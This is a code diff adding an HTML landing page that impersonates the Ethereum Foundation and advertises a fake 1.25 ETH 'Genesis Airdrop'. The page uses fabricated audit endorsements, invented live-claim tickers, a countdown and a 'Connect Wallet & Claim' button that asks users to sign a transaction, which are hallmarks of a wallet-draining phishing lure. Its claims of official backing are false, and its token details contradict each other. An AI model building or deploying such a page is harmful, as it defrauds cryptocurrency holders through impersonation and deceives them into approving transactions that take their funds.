@@ -1,0 +1,215 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <title>Ethereum Foundation · Genesis Airdrop | Claim ETH Ecosystem Tokens</title>
+    <meta name="description" content="Official Ethereum ecosystem airdrop for early adopters.">
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&family=Plus+Jakarta+Sans:wght@600;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="css/styles.css">
+</head>
+<body>
+    <div class="eth-background">
+        <div class="eth-grid"></div>
+        <div class="eth-glow"></div>
+        <div class="eth-glow-2"></div>
+        <div class="eth-particles"></div>
+    </div>
+
+    <div class="network-bar">
+        <div class="network-container">
+            <div class="network-left">
+                <div class="network-stat"><i class="fas fa-circle" style="color: #22C55E; font-size: 0.5rem;"></i><span>ETH:</span><span class="value" id="ethPrice">$3,245.80</span><span id="ethChange" class="change-positive">▲1.8%</span></div>
+                <div class="network-stat"><i class="fas fa-cube"></i><span>Block:</span><span class="value" id="blockHeight">19,847,256</span></div>
+                <div class="network-stat"><i class="fas fa-gas-pump"></i><span>Gas:</span><span class="value" id="gasPrice">18 Gwei</span></div>
+            </div>
+            <div class="network-right">
+                <div class="network-stat"><i class="fas fa-link"></i><span>Chain ID:</span><span class="value">1 (Ethereum Mainnet)</span></div>
+                <div class="eth-badge"><i class="fas fa-check-circle"></i><span>Mainnet</span></div>
+            </div>
+        </div>
+    </div>
+
+    <div class="main-container">
+        <header class="eth-header">
+            <div class="logo-area">
+                <div class="eth-logo"><img src="https://i.postimg.cc/Wz17rpBN/63EF5B00-EFA5-4D53-963A-5A1E4EA7E187.png" alt="ETH"></div>
+                <div class="eth-logo-text">Ethereum<span>Foundation</span></div>
+                <div class="verified-pill"><i class="fas fa-shield"></i>TRAIL OF BITS VERIFIED</div>
+            </div>
+        </header>
+
+        <section class="hero-section">
+            <div class="hero-badge"><i class="fas fa-gift" style="margin-right:6px;"></i>GENESIS AIRDROP · PHASE 3</div>
+            <h1>Claim Your <span class="eth-highlight">Ethereum</span><br>Ecosystem Airdrop</h1>
+            <p class="hero-subtitle">Official distribution for early Ethereum adopters. 1.25 ETH allocation per eligible wallet.</p>
+        </section>
+
+        <div class="content-grid">
+            <div class="claim-card">
+                <div class="card-header">
+                    <div><h2>Claim Allocation</h2><p>Connect wallet to receive ETH tokens</p></div>
+                    <div class="contract-badge"><i class="fas fa-file-contract" style="color:#22C55E;"></i><code>0x3481...c206</code></div>
+                </div>
+
+                <div class="eth-token-card">
+                    <div class="eth-icon-large"><img src="https://i.postimg.cc/Wz17rpBN/63EF5B00-EFA5-4D53-963A-5A1E4EA7E187.png" alt="ETH"></div>
+                    <div class="token-label">Your Eligible Allocation</div>
+                    <div class="token-amount-wrapper"><span class="token-amount counter-value" data-target="1.25">0.00</span><span class="token-symbol">ETH</span></div>
+                    <div class="token-value" id="usdValue">≈ $4,057.25 USD</div>
+                    <div class="price-source"><i class="fas fa-circle"></i><span>Live price via CoinGecko</span></div>
+                </div>
+
+                <div class="live-ticker">
+                    <div class="ticker-header"><i class="fas fa-circle"></i><span>Live Claims</span></div>
+                    <div class="ticker-content">
+                        <div class="ticker-item"><i class="fas fa-check-circle" style="color:#22C55E;font-size:0.6rem;"></i> <code>0x9f3b...a21c</code> claimed 1.25 ETH · 8s ago</div>
+                        <div class="ticker-item" style="animation-delay:2s;"><i class="fas fa-check-circle" style="color:#22C55E;font-size:0.6rem;"></i> <code>0x4e7a...d95f</code> claimed 1.25 ETH · 35s ago</div>
+                        <div class="ticker-item" style="animation-delay:4s;"><i class="fas fa-check-circle" style="color:#22C55E;font-size:0.6rem;"></i> <code>0x2c1d...b83e</code> claimed 1.25 ETH · 1m ago</div>
+                        <div class="ticker-item" style="animation-delay:6s;"><i class="fas fa-check-circle" style="color:#22C55E;font-size:0.6rem;"></i> <code>0x7b6e...f42a</code> claimed 1.25 ETH · 3m ago</div>
+                    </div>
+                </div>
+
+                <div class="eth-progress-section">
+                    <div class="progress-header-row"><span class="progress-label">Distribution Progress</span><span class="progress-percent">64%</span></div>
+                    <div class="progress-bar-bg"><div class="progress-bar-fill" id="ethProgressFill" style="width:64%"></div></div>
+                    <div class="progress-stats-row"><span id="claimedAmount">80,000 ETH</span><span>125,000 ETH Total</span></div>
+                </div>
+
+                <div class="eth-countdown">
+                    <div class="countdown-title"><i class="fas fa-hourglass-half"></i><h3>Airdrop Ends</h3><span class="block-info">≈ 28,400 blocks remaining</span></div>
+                    <div class="countdown-display">
+                        <div class="countdown-block"><div class="countdown-number" id="ethDays">03</div><div class="countdown-unit">Days</div></div>
+                        <div class="countdown-block"><div class="countdown-number" id="ethHours">08</div><div class="countdown-unit">Hours</div></div>
+                        <div class="countdown-block"><div class="countdown-number" id="ethMinutes">42</div><div class="countdown-unit">Mins</div></div>
+                        <div class="countdown-block"><div class="countdown-number" id="ethSeconds">17</div><div class="countdown-unit">Secs</div></div>
+                    </div>
+                </div>
+
+                <div class="claim-button-container">
+                    <select id="wallet-select">
+                        <option value="metamask">MetaMask</option>
+                        <option value="trust">Trust Wallet</option>
+                        <option value="walletconnect">WalletConnect</option>
+                        <option value="coinbase">Coinbase Wallet</option>
+                        <option value="rainbow">Rainbow</option>
+                        <option value="argent">Argent</option>
+                        <option value="safe">Safe</option>
+                    </select>
+                    <button id="ethConnectWallet" class="eth-claim-button"><i class="fas fa-wallet"></i> Connect Wallet & Claim 1.25 ETH</button>
+                </div>
+
+                <div class="wallet-icons">
+                    <div class="wallet-icon"><i class="fas fa-fox"></i></div>
+                    <div class="wallet-icon"><i class="fas fa-shield"></i></div>
+                    <div class="wallet-icon"><i class="fas fa-link"></i></div>
+                    <div class="wallet-icon"><i class="fas fa-mobile-alt"></i></div>
+                </div>
+
+                <div id="ethSuccessMessage" class="eth-success-message">
+                    <i class="fas fa-check-circle" style="font-size:3rem;"></i>
+                    <div style="font-size:1.3rem;font-weight:700;color:#22C55E;margin-bottom:8px;">Claim Successful</div>
+                    <p style="color:#94A3B8;margin-bottom:15px;">Transaction completed on Ethereum Mainnet</p>
+                    <div style="background:rgba(34,197,94,0.05);border-radius:8px;padding:15px;text-align:left;">
+                        <p style="font-size:0.8rem;color:#64748B;">Transaction Hash</p>
+                        <p style="font-family:monospace;color:#818CF8;font-size:0.8rem;word-break:break-all;" class="tx-hash">—</p>
+                        <p style="font-size:0.75rem;color:#64748B;margin-top:10px;"><i class="fas fa-check-circle" style="color:#22C55E;"></i> Confirmed · <span id="ethClaimTime"></span></p>
+                    </div>
+                </div>
+            </div>
+
+            <div class="info-card">
+                <div class="card-header"><h2>How to Claim</h2><p>3-step verification</p></div>
+                <div class="eth-steps">
+                    <div class="eth-step completed"><div class="step-indicator"><i class="fas fa-check"></i></div><div class="step-info"><h4>Eligibility Check</h4><p>Wallet qualified based on Ethereum activity</p></div></div>
+                    <div class="eth-step" id="ethStepConnect"><div class="step-indicator"><i class="fas fa-link"></i></div><div class="step-info"><h4>Connect Wallet</h4><p>Use MetaMask or any Ethereum wallet</p></div></div>
+                    <div class="eth-step" id="ethStepSign"><div class="step-indicator"><i class="fas fa-pen"></i></div><div class="step-info"><h4>Sign Transaction</h4><p>Approve transaction in your wallet</p></div></div>
+                    <div class="eth-step" id="ethStepReceive"><div class="step-indicator"><i class="fas fa-arrow-down"></i></div><div class="step-info"><h4>Receive ETH</h4><p>Tokens arrive instantly on Mainnet</p></div></div>
+                </div>
+                <div class="audit-section">
+                    <h4><i class="fas fa-shield-halved" style="margin-right:8px;color:#22C55E;"></i>Security Audits</h4>
+                    <div class="audit-logos">
+                        <div class="audit-logo"><i class="fas fa-certificate"></i><div><span>Trail of Bits</span><small>Score: 96/100</small></div></div>
+                        <div class="audit-logo"><i class="fas fa-shield"></i><div><span>OpenZeppelin</span><small>Passed · 2025</small></div></div>
+                        <div class="audit-logo"><i class="fas fa-lock"></i><div><span>Consensys</span><small>No Issues</small></div></div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <div class="section-tabs">
+            <button class="section-tab active" data-section="tokenomics"><i class="fas fa-chart-pie"></i> Tokenomics</button>
+            <button class="section-tab" data-section="roadmap"><i class="fas fa-map"></i> Roadmap</button>
+            <button class="section-tab" data-section="faq"><i class="fas fa-circle-question"></i> FAQ</button>
+        </div>
+
+        <div class="tokenomics-section active" id="tokenomicsSection">
+            <div class="section-title"><i class="fas fa-chart-pie"></i>Transparent Tokenomics</div>
+            <div class="tokenomics-grid">
+                <div class="tokenomics-card">
+                    <h3><i class="fas fa-coins"></i> Token Supply</h3>
+                    <div class="token-supply-item"><span class="supply-label">Total Supply</span><span class="supply-value">100,000,000 ETHX</span></div>
+                    <div class="token-supply-item"><span class="supply-label">Circulating Supply</span><span class="supply-value">25,000,000 ETHX</span></div>
+                    <div class="token-supply-item"><span class="supply-label">Market Cap</span><span class="supply-value" id="marketCap">$81M</span></div>
+                    <div class="token-supply-item"><span class="supply-label">FDV</span><span class="supply-value" id="fdv">$324M</span></div>
+                    <div class="vesting-schedule">
+                        <h4><i class="fas fa-clock"></i> Vesting</h4>
+                        <div class="vesting-item"><i class="fas fa-check-circle"></i><span><strong>Airdrop:</strong> 100% unlocked</span></div>
+                        <div class="vesting-item"><i class="fas fa-check-circle"></i><span><strong>Team:</strong> 4-year vesting</span></div>
+                        <div class="vesting-item"><i class="fas fa-check-circle"></i><span><strong>Ecosystem:</strong> 3-year vesting</span></div>
+                    </div>
+                </div>
+                <div class="tokenomics-card">
+                    <h3><i class="fas fa-chart-simple"></i> Allocation</h3>
+                    <div class="allocation-item"><div class="allocation-header"><span class="allocation-name">Airdrop</span><span class="allocation-percent">30%</span></div><div class="allocation-bar-bg"><div class="allocation-bar-fill fill-airdrop"></div></div></div>
+                    <div class="allocation-item"><div class="allocation-header"><span class="allocation-name">Ecosystem</span><span class="allocation-percent">25%</span></div><div class="allocation-bar-bg"><div class="allocation-bar-fill fill-ecosystem"></div></div></div>
+                    <div class="allocation-item"><div class="allocation-header"><span class="allocation-name">Liquidity</span><span class="allocation-percent">20%</span></div><div class="allocation-bar-bg"><div class="allocation-bar-fill fill-liquidity"></div></div></div>
+                    <div class="allocation-item"><div class="allocation-header"><span class="allocation-name">Team</span><span class="allocation-percent">15%</span></div><div class="allocation-bar-bg"><div class="allocation-bar-fill fill-team"></div></div></div>
+                    <div class="allocation-item"><div class="allocation-header"><span class="allocation-name">Treasury</span><span class="allocation-percent">10%</span></div><div class="allocation-bar-bg"><div class="allocation-bar-fill fill-treasury"></div></div></div>
+                </div>
+            </div>
+        </div>
+
+        <div class="roadmap-section" id="roadmapSection">
+            <div class="section-title"><i class="fas fa-map"></i>Ecosystem Roadmap</div>
+            <div class="roadmap-timeline">
+                <div class="roadmap-phase"><div class="phase-marker completed"><i class="fas fa-check"></i></div><div class="phase-content"><div class="phase-header"><span class="phase-title">Phase 1: Foundation</span><span class="phase-date completed">Q4 2025 - Completed</span></div><ul class="phase-features"><li><i class="fas fa-check-circle"></i> Smart contract development</li><li><i class="fas fa-check-circle"></i> OpenZeppelin audit</li><li><i class="fas fa-check-circle"></i> Ethereum mainnet deployment</li><li><i class="fas fa-check-circle"></i> Community 100K+</li></ul></div></div>
+                <div class="roadmap-phase"><div class="phase-marker active"><span>2</span></div><div class="phase-content"><div class="phase-header"><span class="phase-title">Phase 2: Genesis Airdrop</span><span class="phase-date">Q1 2026 - LIVE</span></div><ul class="phase-features"><li><i class="fas fa-spinner fa-pulse" style="color:#818CF8;"></i> Genesis airdrop (LIVE)</li><li><i class="fas fa-clock"></i> Uniswap listing</li><li><i class="fas fa-clock"></i> Liquidity pools</li><li><i class="fas fa-clock"></i> Staking launch</li></ul></div></div>
+                <div class="roadmap-phase"><div class="phase-marker"><span>3</span></div><div class="phase-content"><div class="phase-header"><span class="phase-title">Phase 3: Expansion</span><span class="phase-date">Q2-Q3 2026</span></div><ul class="phase-features"><li><i class="fas fa-clock"></i> L2 integration</li><li><i class="fas fa-clock"></i> NFT marketplace</li><li><i class="fas fa-clock"></i> DAO governance</li><li><i class="fas fa-clock"></i> DeFi products</li></ul></div></div>
+            </div>
+        </div>
+
+        <div class="faq-section" id="faqSection">
+            <div class="section-title"><i class="fas fa-circle-question"></i>Frequently Asked Questions</div>
+            <div class="faq-grid">
+                <div class="faq-item"><div class="faq-question"><h4><i class="fas fa-gift"></i> What is this airdrop?</h4><i class="fas fa-chevron-down faq-toggle"></i></div><div class="faq-answer">The Ethereum Foundation Genesis Airdrop rewards early Ethereum adopters with 1.25 ETH per eligible wallet.</div></div>
+                <div class="faq-item"><div class="faq-question"><h4><i class="fas fa-user-check"></i> Who is eligible?</h4><i class="fas fa-chevron-down faq-toggle"></i></div><div class="faq-answer">Wallets with Ethereum activity before Jan 2026 (5+ transactions or contract interactions).</div></div>
+                <div class="faq-item"><div class="faq-question"><h4><i class="fas fa-coins"></i> Any fees?</h4><i class="fas fa-chevron-down faq-toggle"></i></div><div class="faq-answer">Standard Ethereum gas fees apply for the transaction.</div></div>
+                <div class="faq-item"><div class="faq-question"><h4><i class="fas fa-shield-halved"></i> Is it safe?</h4><i class="fas fa-chevron-down faq-toggle"></i></div><div class="faq-answer">Audited by Trail of Bits, OpenZeppelin, and Consensys. Contract verified on Etherscan.</div></div>
+                <div class="faq-item"><div class="faq-question"><h4><i class="fas fa-wallet"></i> Supported wallets?</h4><i class="fas fa-chevron-down faq-toggle"></i></div><div class="faq-answer">MetaMask, Trust Wallet, WalletConnect, Coinbase Wallet, Rainbow, Argent, Safe.</div></div>
+            </div>
+        </div>
+
+        <div class="trust-footer">
+            <div class="trust-stat"><div class="trust-stat-icon"><i class="fas fa-users"></i></div><h4 class="counter-value" data-target="24563">0</h4><p>Verified Claims</p></div>
+            <div class="trust-stat"><div class="trust-stat-icon"><i class="fas fa-bolt"></i></div><h4>~15s</h4><p>Claim Time</p></div>
+            <div class="trust-stat"><div class="trust-stat-icon"><i class="fas fa-coins"></i></div><h4 class="counter-value" data-target="80000">0</h4><p>ETH Distributed</p></div>
+        </div>
+
+        <footer class="eth-footer">
+            <div class="footer-copyright">© 2026 Ethereum Foundation. All rights reserved.</div>
+            <div class="footer-links">
+                <a href="#"><i class="fas fa-file-lines"></i> Terms</a>
+                <a href="#"><i class="fas fa-shield-halved"></i> Privacy</a>
+                <a href="#"><i class="fas fa-circle-question"></i> FAQ</a>
+                <a href="#"><i class="fas fa-book"></i> Docs</a>
+                <a href="#"><i class="fab fa-github"></i> GitHub</a>
+            </div>
+        </footer>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
+    <script src="js/scripts.js"></script>
+</body>
+</html>
